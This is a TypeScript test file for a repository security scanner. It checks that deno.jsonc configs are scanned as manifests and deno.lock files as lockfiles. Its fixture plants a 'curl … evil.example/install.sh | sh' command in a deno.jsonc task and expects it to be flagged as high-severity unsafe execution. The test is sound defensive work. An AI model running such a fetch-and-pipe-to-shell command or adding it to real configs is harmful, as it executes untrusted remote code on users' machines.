import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a deno.jsonc config is scanned as a manifest like deno.json", () => {
  // Deno reads deno.jsonc exactly like deno.json, including its `tasks`,
  // which run shell commands. Without a surface the file was skipped.
  const text = `{\n  // comments are allowed in deno.jsonc\n  "tasks": { "setup": "${PAYLOAD}" }\n}\n`;
  for (const path of ["deno.jsonc", "apps/api/deno.jsonc", "Deno.JSONC"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["manifests", "source"],
    });
    const inspection = inspected(path, text);
    expect({ path, coverage: inspection.coverage.manifests }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
  }
});

test("a deno.lock is a dependency lock like the other lockfiles", () => {
  expect(surfacesOf("deno.lock")).toEqual(["dependencies", "source"]);
  expect(surfacesOf("packages/web/deno.lock")).toEqual([
    "dependencies",
    "source",
  ]);
});
